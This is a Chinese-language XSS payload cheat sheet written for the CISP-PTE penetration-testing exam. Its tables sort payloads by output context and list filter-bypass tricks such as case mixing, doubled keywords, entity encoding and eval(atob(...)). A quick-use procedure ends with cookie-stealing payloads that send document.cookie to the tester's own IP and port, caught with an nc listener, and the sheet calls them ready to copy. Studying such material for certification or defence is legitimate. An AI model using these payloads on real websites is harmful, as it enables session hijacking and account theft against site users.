# CISP-PTE XSS 考试专用 Payload 速查清单

## 考前核心提醒

1. 考试中XSS核心目标：**获取Cookie/触发指定操作**（而非仅弹窗），弹窗仅用于验证漏洞存在；
2. 第一步先判断**输出上下文**（标签内/属性内/JS内），再选对应Payload；
3. 遇到过滤先测试：输入 `<>`/`script`/`onerror`看是否被拦截，再调整变形。

## 一、按输出上下文分类（核心Payload）

| 输出上下文/场景          | 核心Payload模板                                                                   | 适用场景&考试说明                                                                         |                                                                              |
| :----------------------- | :-------------------------------------------------------------------------------- | :---------------------------------------------------------------------------------------- | :--------------------------------------------------------------------------- |
| HTML标签内容区           | 基础版（无过滤）                                                                  | `<script>alert(1)</script>`                                                             | 验证漏洞存在，考试中优先测这个，被过滤再换下面                               |
| 标签过滤绕过             | `<img src=x onerror=alert(1)>`                                                  | 过滤 `script`标签时用，考试最常用的替代方案                                             |                                                                              |
| 进阶绕过（事件过滤）     | `<svg onload=alert(1)>`                                                         | 过滤 `onerror`时用，svg标签兼容性好，考试高频绕过手段                                   |                                                                              |
| HTML标签属性值           | input属性闭合                                                                     | `" onmouseover=alert(1) x="`                                                            | 双引号未过滤时，闭合value属性+添加鼠标悬浮事件（考试常考input/textarea场景） |
| a标签href属性            | `" onclick=alert(1) href="`                                                     | 闭合a标签href属性+点击事件，需用户交互（考试中若允许交互优先用）                          |                                                                              |
| 单引号属性场景           | `' onfocus=alert(1) x='`                                                        | 标签属性用单引号包裹时（如 `<input value='用户输入'>`）                                 |                                                                              |
| JS字符串上下文           | 双引号字符串闭合                                                                  | `";alert(1);//`                                                                         | 场景示例：`var x="用户输入";`，闭合双引号+执行代码+注释后续内容            |
| 单引号字符串闭合         | `';alert(1);//`                                                                 | 场景示例：`var x='用户输入';`，考试中先测单/双引号哪种生效                              |                                                                              |
| 编码绕过（关键字过滤）   | `"\u0061\u006c\u0065\u0072\u0074(1);//`                                         | 过滤 `alert`关键字时，用Unicode编码（`alert`对应 `\u0061\u006c\u0065\u0072\u0074`） |                                                                              |
| URL伪协议场景            | 基础版                                                                            | `javascript:alert(1)`                                                                   | 无过滤时直接用，点击链接触发                                                 |
| 编码绕过                 | `javascript:alert(1)`                                                           | 过滤 `javascript`关键字时，用HTML实体编码替换部分字符                                   |                                                                              |
| 拿Cookie专用（考试核心） | 基础版                                                                            | `<script>document.location='http://你的IP:端口?c='+document.cookie</script>`            | 无过滤时，将Cookie发送到自己的服务器（需先开NC监听：`nc -nlvp 端口`）      |
| 标签绕过版               | `<img src=x onerror=document.location='http://你的IP:端口?c='+document.cookie>` | 过滤 `script`时用，考试中最常用的拿Cookie方案                                           |                                                                              |

## 二、常见过滤规则绕过变形（考试必背）

| 被过滤的内容 | 绕过变形方式                     | 示例                                                                               |
| :----------- | :------------------------------- | :--------------------------------------------------------------------------------- |
| `script`   | 大小写/双写/HTML实体             | `<ScRiPt>alert(1)</ScRiPt>`、`<scrscriptipt>alert(1)</scrscriptipt>`           |
| `onerror`  | 换事件（onload/onclick/onfocus） | `<img src=x onload=alert(1)>`、`<input onfocus=alert(1) autofocus>`            |
| `<>`       | HTML实体编码                     | `<img src=x onerror=alert(1)>`（`<`=`&#x3c;`，`>`=`&#x3e;`）             |
| 空格         | 用 `/`/`%0a`/`+`替代       | `<img/src=x/onerror=alert(1)>`                                                   |
| `alert`    | 拼接/Base64编码                  | `eval('al'+'ert(1)')`、`eval(atob('YWxlcnQoMSk='))`（Base64对应 `alert(1)`） |

## 三、考场实战步骤（1分钟快速验证+利用）

1. 输入 `<script>alert(1)</script>` → 弹窗=无过滤，直接用拿Cookie Payload；
2. 无弹窗→输入 `<img src=x onerror=alert(1)>` → 弹窗=标签过滤，用事件类Payload；
3. 仍无弹窗→测试单/双引号闭合（如 `"`/`'`）→ 确认属性上下文，用属性闭合Payload；
4. 关键字被过滤→用大小写/双写/编码变形；
5. 验证漏洞后，替换为**拿Cookie的Payload**（替换自己的IP和端口），完成考试要求。

**备注**：本清单适配CISP-PTE考试高频场景，重点记「HTML标签内容区」「属性值」「拿Cookie」三类核心Payload，可直接复制使用，考前5分钟快速过一遍即可应对90%以上XSS考题。
